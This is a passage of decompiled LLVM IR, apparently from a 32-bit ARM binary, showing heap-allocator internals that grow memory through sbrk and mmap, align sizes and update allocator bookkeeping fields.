  %v2_126d0 = load i32, i32* %lr.global-to-local, align 4
  %v3_126d0 = add i32 %v2_126d0, 4
  %v4_126d0 = inttoptr i32 %v3_126d0 to i32*
  store i32 %v1_126d0, i32* %v4_126d0, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_126b0
  store i32 %v6_126a4, i32* %lr.global-to-local, align 4
  %v1_126c850 = load i32, i32* @r4, align 4
  %v2_126c851 = or i32 %v1_126c850, 2
  store i32 %v2_126c851, i32* %r3.global-to-local, align 4
  %v3_126d4 = inttoptr i32 %v6_126a4 to i32*
  store i32 0, i32* %v3_126d4, align 4
  %v1_126d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_126d8 = load i32, i32* %lr.global-to-local, align 4
  %v3_126d8 = add i32 %v2_126d8, 4
  %v4_126d8 = inttoptr i32 %v3_126d8 to i32*
  store i32 %v1_126d8, i32* %v4_126d8, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_126e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v4_126e4, i32* %ip.global-to-local, align 4
  %v1_126e8 = add i32 %v4_126e4, 848
  %v2_126e8 = inttoptr i32 %v1_126e8 to i32*
  %v3_126e8 = load i32, i32* %v2_126e8, align 4
  store i32 %v3_126e8, i32* %r3.global-to-local, align 4
  %v1_126ec = add i32 %v4_126e4, 856
  %v2_126ec = inttoptr i32 %v1_126ec to i32*
  %v3_126ec = load i32, i32* %v2_126ec, align 4
  store i32 %v3_126ec, i32* %r2.global-to-local, align 4
  %v1_126f0 = add i32 %v3_126e8, 1
  store i32 %v1_126f0, i32* %r3.global-to-local, align 4
  %v7_126f8 = icmp sgt i32 %v1_126f0, %v3_126ec
  br i1 %v7_126f8, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_126f0, i32* %v2_126ec, align 4
  %v0_126fc.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_126fc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_126fc = phi i32 [ %v4_126e4, %.thread30 ], [ %v1_126fc.pre, %bb150 ]
  %v0_126fc = phi i32 [ %v1_126f0, %.thread30 ], [ %v0_126fc.pre, %bb150 ]
  %v2_126fc = add i32 %v1_126fc, 848
  %v3_126fc = inttoptr i32 %v2_126fc to i32*
  store i32 %v0_126fc, i32* %v3_126fc, align 4
  %v0_12700 = load i32, i32* %ip.global-to-local, align 4
  %v1_12700 = add i32 %v0_12700, 868
  %v2_12700 = inttoptr i32 %v1_12700 to i32*
  %v3_12700 = load i32, i32* %v2_12700, align 4
  store i32 %v3_12700, i32* %r3.global-to-local, align 4
  %v1_12704 = add i32 %v0_12700, 880
  %v2_12704 = inttoptr i32 %v1_12704 to i32*
  %v3_12704 = load i32, i32* %v2_12704, align 4
  store i32 %v3_12704, i32* %r2.global-to-local, align 4
  %v0_12708 = load i32, i32* @r4, align 4
  %v2_12708 = add i32 %v0_12708, %v3_12700
  store i32 %v2_12708, i32* %r1.global-to-local, align 4
  %v1_1270c = add i32 %v0_12700, 872
  %v2_1270c = inttoptr i32 %v1_1270c to i32*
  %v3_1270c = load i32, i32* %v2_1270c, align 4
  store i32 %v3_1270c, i32* %r3.global-to-local, align 4
  %v1_12714 = add i32 %v0_12700, 884
  %v2_12714 = inttoptr i32 %v1_12714 to i32*
  %v3_12714 = load i32, i32* %v2_12714, align 4
  store i32 %v3_12714, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_12708, %v3_12704
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_12708, i32* %v2_12704, align 4
  %v0_1271c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1271c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_1271c = phi i32 [ %v0_12700, %bb151 ], [ %v1_1271c.pre, %bb152 ]
  %v0_1271c = phi i32 [ %v2_12708, %bb151 ], [ %v0_1271c.pre, %bb152 ]
  %v2_1271c = add i32 %v1_1271c, 868
  %v3_1271c = inttoptr i32 %v2_1271c to i32*
  store i32 %v0_1271c, i32* %v3_1271c, align 4
  %v0_12720 = load i32, i32* %r1.global-to-local, align 4
  %v1_12720 = load i32, i32* %r3.global-to-local, align 4
  %v2_12720 = add i32 %v1_12720, %v0_12720
  store i32 %v2_12720, i32* %r1.global-to-local, align 4
  %v1_12724 = load i32, i32* %r2.global-to-local, align 4
  %v0_12728 = load i32, i32* %lr.global-to-local, align 4
  %v1_12728 = add i32 %v0_12728, 8
  store i32 %v1_12728, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_12720, %v1_12724
  br i1 %tmp216, label %bb154, label %dec_label_pc_12a3c

bb154:                                            ; preds = %bb153
  %v5_1272c = load i32, i32* %ip.global-to-local, align 4
  %v6_1272c = add i32 %v5_1272c, 884
  %v7_1272c = inttoptr i32 %v6_1272c to i32*
  store i32 %v2_12720, i32* %v7_1272c, align 4
  br label %dec_label_pc_12a3c

dec_label_pc_12734:                               ; preds = %dec_label_pc_12678, %dec_label_pc_12658, %dec_label_pc_1268c.dec_label_pc_12734_crit_edge, %dec_label_pc_12668
  %v1_12758 = phi i32 [ %v1_12758.pre, %dec_label_pc_1268c.dec_label_pc_12734_crit_edge ], [ %v0_12600, %dec_label_pc_12668 ], [ %v0_12600, %dec_label_pc_12658 ], [ %v0_12600, %dec_label_pc_12678 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %ip.global-to-local, align 4
  %v4_1273c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v4_1273c, i32* %r3.global-to-local, align 4
  %v1_12740 = add i32 %v4_1273c, 44
  %v2_12740 = inttoptr i32 %v1_12740 to i32*
  %v3_12740 = load i32, i32* %v2_12740, align 4
  store i32 %v3_12740, i32* %r0.global-to-local, align 4
  %v1_12744 = add i32 %v4_1273c, 864
  %v2_12744 = inttoptr i32 %v1_12744 to i32*
  %v3_12744 = load i32, i32* %v2_12744, align 4
  store i32 %v3_12744, i32* %r2.global-to-local, align 4
  %v1_12748 = add i32 %v4_1273c, 840
  %v2_12748 = inttoptr i32 %v1_12748 to i32*
  %v3_12748 = load i32, i32* %v2_12748, align 4
  store i32 %v3_12748, i32* %r3.global-to-local, align 4
  %v1_1274c = add i32 %v3_12740, 4
  %v2_1274c = inttoptr i32 %v1_1274c to i32*
  %v3_1274c = load i32, i32* %v2_1274c, align 4
  store i32 %v3_1274c, i32* %r1.global-to-local, align 4
  %v1_12754 = urem i32 %v3_12744, 2
  %v2_12754 = icmp eq i32 %v1_12754, 0
  %v1_12750 = add i32 %v1_12758, 16
  %v2_12758 = add i32 %v1_12750, %v3_12748
  store i32 %v2_12758, i32* %r3.global-to-local, align 4
  %v1_1275c = and i32 %v3_1274c, -4
  store i32 %v1_1275c, i32* @r8, align 4
  br i1 %v2_12754, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_12734
  %v3_12760 = sub i32 %v2_12758, %v1_1275c
  store i32 %v3_12760, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_12734, %bb155
  %v0_12764 = phi i32 [ %v2_12758, %dec_label_pc_12734 ], [ %v3_12760, %bb155 ]
  %v1_12764 = load i32, i32* %sb.global-to-local, align 4
  %v2_12764 = add i32 %v1_12764, %v0_12764
  store i32 %v2_12764, i32* %r3.global-to-local, align 4
  %v1_12768 = sub i32 -1, %v1_12764
  store i32 %v1_12768, i32* %fp.global-to-local, align 4
  %v2_1276c = and i32 %v2_12764, %v1_12768
  store i32 %v2_1276c, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_1276c, 1
  br i1 %tmp157, label %dec_label_pc_12790, label %dec_label_pc_1277c

dec_label_pc_1277c:                               ; preds = %bb156
  store i32 %v2_1276c, i32* %r0.global-to-local, align 4
  %v1_12780 = call i32 @__GI_sbrk(i32 %v2_1276c)
  store i32 %v1_12780, i32* %r0.global-to-local, align 4
  %v3_12784 = icmp eq i32 %v1_12780, -1
  store i32 %v1_12780, i32* @r4, align 4
  br i1 %v3_12784, label %dec_label_pc_12790, label %dec_label_pc_127fc

dec_label_pc_12790:                               ; preds = %dec_label_pc_1277c, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r1.global-to-local, align 4
  %v4_12798 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v4_12798, i32* %r6.global-to-local, align 4
  %v1_1279c = add i32 %v4_12798, 864
  %v2_1279c = inttoptr i32 %v1_1279c to i32*
  %v3_1279c = load i32, i32* %v2_1279c, align 4
  store i32 %v3_1279c, i32* %r3.global-to-local, align 4
  %v1_127a0 = urem i32 %v3_1279c, 2
  %v2_127a0 = icmp eq i32 %v1_127a0, 0
  br i1 %v2_127a0, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_12790
  %v1_127a4 = load i32, i32* @r8, align 4
  %v2_127a4 = load i32, i32* %sb.global-to-local, align 4
  %v3_127a4 = add i32 %v2_127a4, %v1_127a4
  %v2_127a8 = load i32, i32* @r5, align 4
  %v3_127a8 = add i32 %v3_127a4, %v2_127a8
  store i32 %v3_127a8, i32* %r3.global-to-local, align 4
  %v2_127ac = load i32, i32* %fp.global-to-local, align 4
  %v3_127ac = and i32 %v2_127ac, %v3_127a8
  store i32 %v3_127ac, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_12790
  %v0_127b0.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_127b0 = phi i32 [ %v0_127b0.pr, %.thread32thread-pre-split ], [ %v3_127ac, %bb158 ]
  %v2_127b0 = icmp ugt i32 %v0_127b0, 1048575
  br i1 %v2_127b0, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_127c8 = phi i32 [ %v0_127b0, %.thread32 ], [ 1048576, %bb159 ]
  %v1_127b8 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_127c8, %v1_127b8
  br i1 %tmp217, label %dec_label_pc_127c0, label %dec_label_pc_12a24

dec_label_pc_127c0:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_127c8, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_127dc = call i32 @mmap(i32 0, i32 %v0_127c8, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_127dc, i32* %r0.global-to-local, align 4
  %v3_127e0 = icmp eq i32 %v6_127dc, -1
  %v8_127e0 = icmp eq i32 %v6_127dc, -1
  store i32 %v6_127dc, i32* @r4, align 4
  br i1 %v8_127e0, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_127c0
  %v1_127e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_127e8 = add i32 %v1_127e8, 864
  %v3_127e8 = inttoptr i32 %v2_127e8 to i32*
  %v4_127e8 = load i32, i32* %v3_127e8, align 4
  %v2_127ec = load i32, i32* @r5, align 4
  %v3_127ec = add i32 %v2_127ec, %v6_127dc
  store i32 %v3_127ec, i32* %r0.global-to-local, align 4
  %v2_127f0 = and i32 %v4_127e8, -2
  store i32 %v2_127f0, i32* %r3.global-to-local, align 4
  store i32 %v2_127f0, i32* %v3_127e8, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_127c0, %bb161
  br i1 %v3_127e0, label %dec_label_pc_127fc, label %dec_label_pc_12800

dec_label_pc_127fc:                               ; preds = %.thread35, %dec_label_pc_1277c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12800

dec_label_pc_12800:                               ; preds = %.thread35, %dec_label_pc_127fc
  %v0_12800 = load i32, i32* @r4, align 4
  %v7_12800 = icmp eq i32 %v0_12800, -1
  br i1 %v7_12800, label %dec_label_pc_12a24, label %dec_label_pc_12808

dec_label_pc_12808:                               ; preds = %dec_label_pc_12800
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r2.global-to-local, align 4
  %v4_12810 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v4_12810, i32* %ip.global-to-local, align 4
  store i32 %v3_12740, i32* %r2.global-to-local, align 4
  %v1_12818 = add i32 %v4_12810, 872
  %v2_12818 = inttoptr i32 %v1_12818 to i32*
  %v3_12818 = load i32, i32* %v2_12818, align 4
  %v1_1281c = load i32, i32* @r8, align 4
  %v2_1281c = add i32 %v1_1281c, %v3_12740
  store i32 %v2_1281c, i32* %r1.global-to-local, align 4
  %v0_12820 = load i32, i32* @r5, align 4
  %v2_12820 = add i32 %v0_12820, %v3_12818
  store i32 %v2_12820, i32* %r3.global-to-local, align 4
  %v9_12824 = icmp eq i32 %v0_12800, %v2_1281c
  br i1 %v9_12824, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_12808
  store i32 %v2_12820, i32* %v2_12818, align 4
  br label %dec_label_pc_12840

bb162:                                            ; preds = %dec_label_pc_12808
  %v1_12828 = load i32, i32* %r0.global-to-local, align 4
  %v8_12828 = icmp eq i32 %v1_12828, -1
  store i32 %v2_12820, i32* %v2_12818, align 4
  br i1 %v8_12828, label %.thread37, label %dec_label_pc_12840

.thread37:                                        ; preds = %bb162
  %v1_12830 = load i32, i32* @r5, align 4
  %v2_12830 = load i32, i32* @r8, align 4
  %v3_12830 = add i32 %v2_12830, %v1_12830
  %v2_12834 = or i32 %v3_12830, 1
  store i32 %v2_12834, i32* %r3.global-to-local, align 4
  %v2_12838 = load i32, i32* %r2.global-to-local, align 4
  %v3_12838 = add i32 %v2_12838, 4
  %v4_12838 = inttoptr i32 %v3_12838 to i32*
  store i32 %v2_12834, i32* %v4_12838, align 4
  br label %dec_label_pc_129b8

dec_label_pc_12840:                               ; preds = %bb162, %.thread125
  %v0_12844.pr = load i32, i32* @r8, align 4
  %v0_12840 = load i32, i32* %ip.global-to-local, align 4
  %v1_12840 = add i32 %v0_12840, 864
  %v2_12840 = inttoptr i32 %v1_12840 to i32*
  %v3_12840 = load i32, i32* %v2_12840, align 4
  store i32 %v3_12840, i32* %r2.global-to-local, align 4
  %v2_12844 = icmp eq i32 %v0_12844.pr, 0
  br i1 %v2_12844, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_12840
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_12840
  %v2_1284c = urem i32 %v3_12840, 2
  store i32 %v2_1284c, i32* %r3.global-to-local, align 4
  %v2_12850 = icmp eq i32 %v2_1284c, 0
  br i1 %v2_12850, label %.thread43, label %dec_label_pc_12858

dec_label_pc_12858:                               ; preds = %.thread39
  %v0_12858 = load i32, i32* @r4, align 4
  %v1_12858 = load i32, i32* %r1.global-to-local, align 4
  %v3_12858 = icmp ult i32 %v0_12858, %v1_12858
  br i1 %v3_12858, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_12858
  %v2_1285c = and i32 %v3_12840, -2
  store i32 %v2_1285c, i32* %r3.global-to-local, align 4
  store i32 %v2_1285c, i32* %v2_12840, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_12858, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %ip.global-to-local, align 4
  %v4_1286c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v4_1286c, i32* @r7, align 4
  %v1_12870 = add i32 %v4_1286c, 864
  %v2_12870 = inttoptr i32 %v1_12870 to i32*
  %v3_12870 = load i32, i32* %v2_12870, align 4
  store i32 %v3_12870, i32* %r3.global-to-local, align 4
  %v1_12874 = urem i32 %v3_12870, 2
  store i32 %v1_12874, i32* @r6, align 4
  %v2_12874 = icmp eq i32 %v1_12874, 0
  br i1 %v2_12874, label %dec_label_pc_12908, label %dec_label_pc_1287c

dec_label_pc_1287c:                               ; preds = %.thread43
  %v0_1287c = load i32, i32* @r8, align 4
  %v2_1287c = icmp eq i32 %v0_1287c, 0
  br i1 %v2_1287c, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_1287c
  %v2_12880 = add i32 %v4_1286c, 872
  %v3_12880 = inttoptr i32 %v2_12880 to i32*
  %v4_12880 = load i32, i32* %v3_12880, align 4
  store i32 %v4_12880, i32* %r2.global-to-local, align 4
  %v1_12884 = load i32, i32* %r1.global-to-local, align 4
  %v2_12884 = load i32, i32* @r4, align 4
  %v3_12884 = sub i32 %v2_12884, %v1_12884
  %v3_12888 = add i32 %v3_12884, %v4_12880
  store i32 %v3_12888, i32* %r3.global-to-local, align 4
  store i32 %v3_12888, i32* %v3_12880, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_1287c, %bb164
  %v0_12890 = load i32, i32* @r4, align 4
  %v1_12890 = urem i32 %v0_12890, 8
  store i32 %v1_12890, i32* %r3.global-to-local, align 4
  %v2_12890 = icmp eq i32 %v1_12890, 0
  br i1 %v2_12890, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_12894 = sub nsw i32 8, %v1_12890
  store i32 %v2_12894, i32* %r3.global-to-local, align 4
  %v3_12898 = add i32 %v2_12894, %v0_12890
  store i32 %v3_12898, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_128a0 = phi i32 [ 0, %.thread46 ], [ %v2_12894, %bb165 ]
  %v1_1289c = load i32, i32* @r5, align 4
  %v2_1289c = add i32 %v1_1289c, %v0_12890
  store i32 %v2_1289c, i32* @r6, align 4
  %v1_128a0 = load i32, i32* @r8, align 4
  %v2_128a0 = add i32 %v2_1289c, %v0_128a0
  %v2_128a4 = add i32 %v2_128a0, %v1_128a0
  store i32 %v2_128a4, i32* %r1.global-to-local, align 4
  %v1_128a8 = load i32, i32* %sb.global-to-local, align 4
  %v2_128a8 = add i32 %v1_128a8, %v2_128a4
  %v1_128ac = load i32, i32* %fp.global-to-local, align 4
  %v2_128ac = and i32 %v1_128ac, %v2_128a8
  store i32 %v2_128ac, i32* %r2.global-to-local, align 4
  %v2_128b0 = sub i32 0, %v2_1289c
  store i32 %v2_128b0, i32* %r3.global-to-local, align 4
  %v2_128b4 = sub i32 %v2_128ac, %v2_1289c
  store i32 %v2_128b4, i32* @r5, align 4
  store i32 %v2_128b4, i32* %r0.global-to-local, align 4
  br i1 %v2_12890, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_12890, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_128c0 = call i32 @__GI_sbrk(i32 %v2_128b4)
  store i32 %v1_128c0, i32* %r0.global-to-local, align 4
  %v3_128c4 = icmp eq i32 %v1_128c0, -1
  br i1 %v3_128c4, label %dec_label_pc_128cc, label %dec_label_pc_128dc

dec_label_pc_128cc:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_128d0 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_128d0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12934

dec_label_pc_128dc:                               ; preds = %bb167
  %v1_128dc = load i32, i32* @r4, align 4
  %v3_128dc = icmp ult i32 %v1_128c0, %v1_128dc
  br i1 %v3_128dc, label %dec_label_pc_128e4, label %dec_label_pc_12934

dec_label_pc_128e4:                               ; preds = %dec_label_pc_128dc
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r0.global-to-local, align 4
  %v4_128ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v4_128ec, i32* %r2.global-to-local, align 4
  %v1_128f0 = add i32 %v4_128ec, 864
  %v2_128f0 = inttoptr i32 %v1_128f0 to i32*
  %v3_128f0 = load i32, i32* %v2_128f0, align 4
  %v0_128f4 = load i32, i32* @r6, align 4
  store i32 %v0_128f4, i32* %r0.global-to-local, align 4
  %v1_128f8 = and i32 %v3_128f0, -2
  store i32 %v1_128f8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_128f8, i32* %v2_128f0, align 4
  br label %dec_label_pc_12934

dec_label_pc_12908:                               ; preds = %.thread43
  %v0_12908 = load i32, i32* %r0.global-to-local, align 4
  %v3_12908 = icmp eq i32 %v0_12908, -1
  br i1 %v3_12908, label %dec_label_pc_12910, label %dec_label_pc_1292c

dec_label_pc_12910:                               ; preds = %dec_label_pc_12908
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12914 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12914, i32* %r0.global-to-local, align 4
  %v0_12918 = load i32, i32* @r7, align 4
  %v1_12918 = add i32 %v0_12918, 872
  %v2_12918 = inttoptr i32 %v1_12918 to i32*
  %v3_12918 = load i32, i32* %v2_12918, align 4
  store i32 %v3_12918, i32* %r2.global-to-local, align 4
  %v0_1291c = load i32, i32* @r4, align 4
  %v0_12920 = load i32, i32* @r5, align 4
  %v2_1291c = add i32 %v3_12918, %v1_12914
  %v2_12920 = sub i32 %v2_1291c, %v0_1291c
  %v2_12924 = sub i32 %v2_12920, %v0_12920
  store i32 %v2_12924, i32* %r3.global-to-local, align 4
  store i32 %v2_12924, i32* %v2_12918, align 4
  %v0_12930.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1292c

dec_label_pc_1292c:                               ; preds = %dec_label_pc_12908, %dec_label_pc_12910
  %v0_12930 = phi i32 [ 0, %dec_label_pc_12908 ], [ %v0_12930.pre, %dec_label_pc_12910 ]
  %v0_1292c = load i32, i32* @r4, align 4
  store i32 %v0_1292c, i32* @r7, align 4
  store i32 %v0_12930, i32* @r5, align 4
  br label %dec_label_pc_12934

dec_label_pc_12934:                               ; preds = %dec_label_pc_128dc, %dec_label_pc_128e4, %dec_label_pc_128cc, %dec_label_pc_1292c
  %v0_12934 = load i32, i32* %r0.global-to-local, align 4
  %v7_12934 = icmp eq i32 %v0_12934, -1
  br i1 %v7_12934, label %dec_label_pc_129b8, label %dec_label_pc_1293c

dec_label_pc_1293c:                               ; preds = %dec_label_pc_12934
  %v1_1293c = load i32, i32* @r5, align 4
  %v2_1293c = add i32 %v1_1293c, %v0_12934
  %v0_12940 = load i32, i32* @r7, align 4
  %v2_12940 = sub i32 %v2_1293c, %v0_12940
  %v1_12944 = or i32 %v2_12940, 1
  %v2_12948 = add i32 %v0_12940, 4
  %v3_12948 = inttoptr i32 %v2_12948 to i32*
  store i32 %v1_12944, i32* %v3_12948, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12954 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v4_12954, i32* @r6, align 4
  %v1_12958 = add i32 %v4_12954, 872
  %v2_12958 = inttoptr i32 %v1_12958 to i32*
  %v3_12958 = load i32, i32* %v2_12958, align 4
  %v0_1295c = load i32, i32* @r8, align 4
  %v2_1295c = icmp eq i32 %v0_1295c, 0
  %v0_12960 = load i32, i32* @r5, align 4
  %v2_12960 = add i32 %v0_12960, %v3_12958
  store i32 %v2_12960, i32* %r3.global-to-local, align 4
  store i32 %v2_12960, i32* %v2_12958, align 4
  %v0_12968 = load i32, i32* @r7, align 4
  %v1_12968 = load i32, i32* @r6, align 4
  %v2_12968 = add i32 %v1_12968, 44
  %v3_12968 = inttoptr i32 %v2_12968 to i32*
  store i32 %v0_12968, i32* %v3_12968, align 4
  br i1 %v2_1295c, label %dec_label_pc_129b8, label %dec_label_pc_12970

dec_label_pc_12970:                               ; preds = %dec_label_pc_1293c
  %v0_12974 = load i32, i32* @r8, align 4
  %v1_12974 = add i32 %v0_12974, -12
  %v1_12978 = and i32 %v1_12974, -8
  store i32 %v3_12740, i32* %ip.global-to-local, align 4
  %v2_12980 = add i32 %v1_12978, %v3_12740
  store i32 %v2_12980, i32* %r1.global-to-local, align 4
  %v2_12984 = icmp ugt i32 %v1_12978, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_1298c = or i32 %v1_12978, 1
  store i32 %v1_1298c, i32* %r3.global-to-local, align 4
  store i32 %v1_1298c, i32* %v2_1274c, align 4
  %v0_12994 = load i32, i32* %r2.global-to-local, align 4
  %v1_12994 = load i32, i32* %r1.global-to-local, align 4
  %v2_12994 = add i32 %v1_12994, 8
  %v3_12994 = inttoptr i32 %v2_12994 to i32*
  store i32 %v0_12994, i32* %v3_12994, align 4
  %v0_12998 = load i32, i32* %r2.global-to-local, align 4
  %v1_12998 = load i32, i32* %r1.global-to-local, align 4
  %v2_12998 = add i32 %v1_12998, 4
  %v3_12998 = inttoptr i32 %v2_12998 to i32*
  store i32 %v0_12998, i32* %v3_12998, align 4
  br i1 %v2_12984, label %dec_label_pc_129a0, label %dec_label_pc_129b8

dec_label_pc_129a0:                               ; preds = %dec_label_pc_12970
  %v0_129a0 = load i32, i32* @r6, align 4
  %v1_129a0 = add i32 %v0_129a0, 836
  %v2_129a0 = inttoptr i32 %v1_129a0 to i32*
  %v3_129a0 = load i32, i32* %v2_129a0, align 4
  store i32 %v3_129a0, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_129a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_129a8 = add i32 %v0_129a8, 8
  store i32 %v1_129a8, i32* @r0, align 4
  store i32 -1, i32* %v2_129a0, align 4
  %v0_129b0 = call i32 @free()
  store i32 %v0_129b0, i32* %r0.global-to-local, align 4
  %v0_129b4 = load i32, i32* @r4, align 4
  %v1_129b4 = load i32, i32* @r6, align 4
  %v2_129b4 = add i32 %v1_129b4, 836
  %v3_129b4 = inttoptr i32 %v2_129b4 to i32*
  store i32 %v0_129b4, i32* %v3_129b4, align 4
  br label %dec_label_pc_129b8

dec_label_pc_129b8:                               ; preds = %.thread37, %dec_label_pc_12970, %dec_label_pc_1293c, %dec_label_pc_12934, %dec_label_pc_129a0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r0.global-to-local, align 4
  %v4_129c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v4_129c0, i32* %lr.global-to-local, align 4
  %v1_129c4 = add i32 %v4_129c0, 872
  store i32 %v1_129c4, i32* %r1.global-to-local, align 4
  %v1_129c8 = inttoptr i32 %v1_129c4 to i32*
  %v2_129c8 = load i32, i32* %v1_129c8, align 4
  store i32 %v2_129c8, i32* %r1.global-to-local, align 4
  %v3_129c8 = add i32 %v4_129c0, 876
  %v4_129c8 = inttoptr i32 %v3_129c8 to i32*
  %v5_129c8 = load i32, i32* %v4_129c8, align 4
  store i32 %v5_129c8, i32* %r3.global-to-local, align 4
  %v1_129d0 = add i32 %v4_129c0, 868
  %v2_129d0 = inttoptr i32 %v1_129d0 to i32*
  %v3_129d0 = load i32, i32* %v2_129d0, align 4
  store i32 %v3_129d0, i32* %r3.global-to-local, align 4
  %v1_129d4 = add i32 %v4_129c0, 884
  %v2_129d4 = inttoptr i32 %v1_129d4 to i32*
  %v3_129d4 = load i32, i32* %v2_129d4, align 4
  store i32 %v3_129d4, i32* %r2.global-to-local, align 4
  %v2_129d8 = add i32 %v3_129d0, %v2_129c8
  store i32 %v2_129d8, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_129c8, %v5_129c8
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_129b8
  store i32 %v2_129c8, i32* %v4_129c8, align 4
  %v0_129e0.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_129e0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_129b8, %bb168
  %v1_129e0 = phi i32 [ %v3_129d4, %dec_label_pc_129b8 ], [ %v1_129e0.pre, %bb168 ]
  %v4_129e4 = phi i32 [ %v2_129d8, %dec_label_pc_129b8 ], [ %v0_129e0.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_129e4, %v1_129e0
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_129e4 = load i32, i32* %lr.global-to-local, align 4
  %v6_129e4 = add i32 %v5_129e4, 884
  %v7_129e4 = inttoptr i32 %v6_129e4 to i32*
  store i32 %v4_129e4, i32* %v7_129e4, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_129e8 = load i32, i32* %lr.global-to-local, align 4
  %v1_129e8 = add i32 %v0_129e8, 44
